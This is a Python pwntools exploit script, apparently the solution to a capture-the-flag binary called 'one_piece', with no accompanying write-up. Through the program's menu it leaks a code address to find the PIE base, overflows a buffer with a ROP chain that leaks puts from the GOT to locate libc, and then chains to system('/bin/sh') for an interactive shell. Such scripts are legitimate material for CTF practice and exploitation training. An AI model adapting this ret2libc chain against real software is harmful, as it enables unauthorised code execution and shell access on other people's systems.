from pwn import *
#context_level='DEBUG'

p = process("./one_piece")
elf = ELF("./one_piece", checksec=False)

def main():

	def read(x):
		p.sendlineafter(">>", "read")
		p.sendafter(">>", x)

	def gomugomunomi(payload):
		p.sendlineafter(">>", "gomugomunomi")
		p.sendline(payload)

	gomugomunomi("AAAA")
	leak = int("0x" + p.recvline().split(" : ")[-1], 16)
	log.info("Leak: " + hex(leak))

	pie_base = leak - 0xa3a
	log.info("Pie base: " + hex(pie_base))

	puts_plt = p64(pie_base + 0x720)
	puts_got = p64(pie_base + 0x201fa0)
	pop_rdi  = p64(pie_base + 0xba3)
	main = p64(pie_base + 0xa3f)
	pop_rsi = p64(pie_base + 0xba1)
	ret = p64(pie_base + 0x70e)

	p.sendline("A" * 0x38 + pop_rdi + puts_got + puts_plt + main)
	p.recvline()

	leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
	log.success("puts@libc: " + hex(leaked_puts))

	libc = ELF('libc.so.6')

	libc.address = leaked_puts - 0x087490
	log.info('Libc base: ' + hex(libc.address))

	gomugomunomi("A" * 0x38 + ret + pop_rdi + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.symbols['system']))

	p.interactive()

if __name__=="__main__":
	main()
